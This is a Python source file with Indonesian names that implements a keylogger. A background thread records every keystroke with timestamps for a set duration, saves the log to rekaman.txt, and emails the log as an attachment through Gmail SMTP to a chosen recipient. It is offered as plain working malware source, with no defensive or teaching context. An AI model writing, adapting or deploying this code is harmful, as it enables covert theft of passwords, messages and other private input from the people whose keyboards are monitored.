from datetime import datetime, timedelta
from threading import Thread, Lock
import time
import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

class Rekam:
    def __init__(self, durasi):
        self.rekaman = []
        self.durasi = durasi  #durasi dalam detik
        self.thread = Thread(target=self._rekam_background)
        self.thread.daemon = True
        self.email_pengirim = None
        self.password_pengirim = None
        self.email_penerima = None
        self.lock = Lock()  
        
    def set_email(self, email_pengirim, password_pengirim, email_penerima):
        self.email_pengirim = email_pengirim
        self.password_pengirim = password_pengirim
        self.email_penerima = email_penerima
        
    def catatRekam(self):
        with open('rekaman.txt', 'a') as file:
            for waktu, input_data in self.rekaman:
                file.write(f'{waktu.strftime("%H:%M:%S %d:%m:%Y")} - {input_data}\n')
        
    def start(self):
        self.thread.start()
        
    def stop(self):
        with self.lock:  # menggunakan lock untuk memastikan bahwa method tidak dijalankan bersamaan
            self.thread.join()
            self.kirim_email()
    
    def _rekam_background(self):
        waktu_mulai = datetime.now()
        while (datetime.now() - waktu_mulai).total_seconds() < self.durasi:
            event = keyboard.read_event()
            waktu = datetime.fromtimestamp(event.time)
            self.rekaman.append((waktu, event.name))
        
    def kirim_email(self):
        with open('rekaman.txt', 'r') as file:
            text = file.read()
        attachment = MIMEApplication(text)
        attachment.add_header('Content-Disposition', 'attachment', filename='rekaman.txt')
        msg = MIMEMultipart()
        msg['From'] = self.email_pengirim
        msg['To'] = self.email_penerima
        msg['Subject'] = 'Rekaman Aktifitas Keyboard'
        msg.attach(MIMEText('Berikut ini adalah rekaman aktifitas keyboard:'))
        msg.attach(attachment)
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(self.email_pengirim, self.password_pengirim)
            server.sendmail(self.email_pengirim, self.email_penerima, msg.as_string())
